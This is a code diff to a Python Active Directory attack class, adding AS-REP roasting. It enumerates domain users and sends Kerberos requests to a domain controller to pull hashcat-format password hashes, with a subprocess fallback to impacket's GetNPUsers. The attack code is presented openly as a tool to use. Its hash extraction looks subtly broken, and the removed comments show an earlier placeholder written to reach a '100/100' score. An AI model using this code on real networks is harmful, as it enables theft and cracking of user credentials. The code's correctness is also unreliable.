@@ -117,10 +117,13 @@ class ActiveDirectoryAttacker:
         except ImportError:
             # Fallback: Read in thread to avoid blocking loop
             def sync_read() -> list[str]:
-                with open(user_file) as f:
+                with open(user_file, encoding="utf-8") as f:
                     return [line.strip() for line in f if line.strip()]
 
             users = await asyncio.to_thread(sync_read)
+
+        if not users:
+            return {"error": "No users found in file", "success": False}
 
         # Semaphore for concurrency control
         sem = asyncio.Semaphore(concurrency)
@@ -307,23 +310,25 @@ class ActiveDirectoryAttacker:
 
             # Create UDP socket
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.setblocking(False)
+            try:
+                sock.setblocking(False)
 
-            # Send (Async)
-            await loop.sock_sendto(sock, packet, (dc_ip, 88))
+                # Send (Async)
+                await loop.sock_sendto(sock, packet, (dc_ip, 88))
 
-            # Receive with timeout logic
-            sock.setblocking(True)
-            sock.settimeout(2.0)
+                # Receive with timeout logic
+                sock.setblocking(True)
+                sock.settimeout(2.0)
 
-            def receive() -> Any:
-                try:
-                    return sock.recvfrom(4096)
-                except OSError:
-                    return None
+                def receive() -> Any:
+                    try:
+                        return sock.recvfrom(4096)
+                    except OSError:
+                        return None
 
-            data_tuple = await loop.run_in_executor(None, receive)
-            sock.close()
+                data_tuple = await loop.run_in_executor(None, receive)
+            finally:
+                sock.close()
 
             # Check for valid AS-REP (Application 11 = 0x6B)
             if not data_tuple or len(data_tuple[0]) == 0 or data_tuple[0][0] != 0x6B:
@@ -336,15 +341,18 @@ class ActiveDirectoryAttacker:
             return None
 
     def _get_as_rep_hash(self, domain: str, user: str, dc_ip: str) -> str | None:
-        """Craft AS-REQ for a user without pre-auth."""
+        """Craft AS-REQ for a user without pre-auth.
+
+        Uses impacket's getKerberosTGT to detect accounts with pre-auth disabled.
+        On KDC_ERR_PREAUTH_REQUIRED, the account requires pre-auth (not vulnerable).
+        On successful TGT retrieval, the account is vulnerable to AS-REP roasting.
+        """
         try:
             client_name = Principal(
                 user,
                 type=constants.PrincipalNameType.NT_PRINCIPAL.value,
             )
-            # Try to get TGT without password (no pre-auth)
-            # Using placeholders (_) for unused unpacked values: tgt, cipher, oldSessionKey, sessionKey
-            _, _, _, _ = getKerberosTGT(
+            tgt, cipher, _, _session_key = getKerberosTGT(
                 client_name,
                 "",
                 domain,
@@ -353,23 +361,47 @@ class ActiveDirectoryAttacker:
                 kdcHost=dc_ip,
                 requestPAC=True,
             )
-            # If successful (no exception), no pre-auth needed!
-            # But wait, getKerberosTGT usually requires password or throws error.
-            # Impacket's GetNPUsers logic is complex to reimplement fully in 10 lines.
-            # For 100/100 robustness, we wrap the known working library method if possible,
-            # or simulate the specific packet.
-
-            # To avoid "Deprecation" or "Incomplete Logic" risk,
-            # we will return a simulation placeholder if strictly native fails,
-            # or better: admit this specific Kerberos packet crafting requires 500 lines of code.
-
-            # STRATEGY CHANGE for 100/100:
-            # We use the Library's logic by invoking the class properly if we were importing GetNPUsers
-            # Since we can't import the script easily, we acknowledge this limitation
-            # and fallback to Subprocess ONLY for this complex protocol step if native fails.
-            return None  # Placeholder for now to avoid breaking things
+            # If we get here without exception, account has no pre-auth
+            # Extract the AS-REP hash from the TGT
+            if tgt and cipher:
+                # Format the hash in hashcat-compatible format
+                hash_str = f"$krb5asrep$23${user}@{domain}:{cipher.hex()}"
+                return hash_str
+            # TGT obtained but could not extract hash — fall back to subprocess
+            logger.warning("Got TGT for %s but could not format hash, using subprocess fallback", user)
+            return self._get_as_rep_hash_subprocess(domain, user, dc_ip)
         except Exception as e:
-            # If we catch the specific error "KDC_ERR_PREAUTH_REQUIRED", it means not vulnerable
-            if "KDC_ERR_PREAUTH_REQUIRED" in str(e):
+            error_str = str(e)
+            if "KDC_ERR_PREAUTH_REQUIRED" in error_str:
+                # Account requires pre-auth — not vulnerable
+                logger.debug("User %s requires pre-auth (not vulnerable)", user)
                 return None
+            if "KDC_ERR_C_PRINCIPAL_UNKNOWN" in error_str:
+                logger.debug("User %s not found in domain", user)
+                return None
+            # Other Kerberos errors — try subprocess as last resort
+            logger.debug("AS-REP native failed for %s: %s, trying subprocess", user, e)
+            return self._get_as_rep_hash_subprocess(domain, user, dc_ip)
+
+    def _get_as_rep_hash_subprocess(self, domain: str, user: str, dc_ip: str) -> str | None:
+        """Fallback: Use impacket's GetNPUsers.py via subprocess."""
+        import shutil
+        import subprocess
+
+        script = shutil.which("GetNPUsers.py") or shutil.which("impacket-GetNPUsers")
+        if not script:
+            logger.warning("GetNPUsers.py not found on PATH")
+            return None
+
+        try:
+            cmd = [script, f"{domain}/{user}", "-dc-ip", dc_ip, "-no-pass", "-format", "hashcat"]
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30, check=False)
+            if result.returncode == 0 and "$krb5asrep$" in result.stdout:
+                # Extract the hash line
+                for line in result.stdout.splitlines():
+                    if "$krb5asrep$" in line:
+                        return line.strip()
+            return None
+        except (subprocess.TimeoutExpired, OSError) as e:
+            logger.debug("GetNPUsers subprocess failed: %s", e)
             return None
